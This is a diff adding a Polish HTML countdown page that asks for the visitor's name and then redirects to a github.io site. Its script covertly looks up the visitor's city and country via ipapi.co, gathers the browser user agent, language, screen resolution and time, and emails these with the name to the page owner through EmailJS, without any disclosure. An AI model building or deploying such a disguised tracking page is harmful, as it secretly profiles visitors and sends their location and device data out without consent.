@@ -1,0 +1,137 @@
+
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <title>Odliczanie</title>
+
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+    <script>
+        (function() {
+            emailjs.init("yPRPwU29w-Icq4hK6"); // ← Wklej swój PUBLIC KEY
+        })();
+    </script>
+
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #000;
+            color: #fff;
+            font-family: "Segoe UI", Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
+        }
+
+        #nameBox {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        input {
+            padding: 10px;
+            font-size: 1rem;
+            border: none;
+            outline: none;
+        }
+
+        button {
+            padding: 10px 20px;
+            font-size: 1rem;
+            cursor: pointer;
+            border: none;
+        }
+
+        #timer {
+            font-size: 4rem;
+            margin-top: 20px;
+            display: none;
+        }
+
+        #goButton {
+            display: none;
+            margin-top: 30px;
+            padding: 12px 28px;
+            background-color: #fff;
+            color: #000;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="nameBox">
+        <h2>Podaj swoje imię:</h2>
+        <input type="text" id="username" placeholder="Twoje imię">
+        <button onclick="startProcess()">Start</button>
+    </div>
+
+    <div id="timer"></div>
+    <button id="goButton" onclick="window.location.href='https://szymixv.github.io/slonce/'">PRZEJDŹ</button>
+
+<script>
+    const START_TIME = 10; // czas odliczania
+
+    function startProcess() {
+        const name = document.getElementById("username").value.trim();
+        if (!name) return alert("Podaj imię!");
+
+        // Pobieranie geolokalizacji z ipapi.co
+        fetch("https://ipapi.co/json/")
+            .then(res => res.json())
+            .then(data => {
+                const country = data.country_name || "Nieznane";
+                const city = data.city || "Nieznane";
+
+                // Dane urządzenia
+                const device = navigator.userAgent;
+                const language = navigator.language;
+                const resolution = window.screen.width + "x" + window.screen.height;
+                const time = new Date().toLocaleString();
+
+                // Wysyłanie maila
+                emailjs.send("service_oaglepf", "template_lsjnbvq", {
+                    name: name,
+                    device: device,
+                    language: language,
+                    resolution: resolution,
+                    time: time,
+                    country: country,
+                    city: city
+                });
+
+                // Ukrycie formularza i start odliczania
+                document.getElementById("nameBox").style.display = "none";
+                startTimer();
+            })
+            .catch(() => {
+                alert("Błąd pobierania lokalizacji");
+            });
+    }
+
+    function startTimer() {
+        let remaining = START_TIME;
+        const timer = document.getElementById("timer");
+        const button = document.getElementById("goButton");
+
+        timer.style.display = "block";
+
+        const interval = setInterval(() => {
+            timer.textContent = remaining;
+            remaining--;
+
+            if (remaining < 0) {
+                clearInterval(interval);
+                button.style.display = "inline-block";
+            }
+        }, 1000);
+    }
+</script>
+
+
+</body>
+</html>
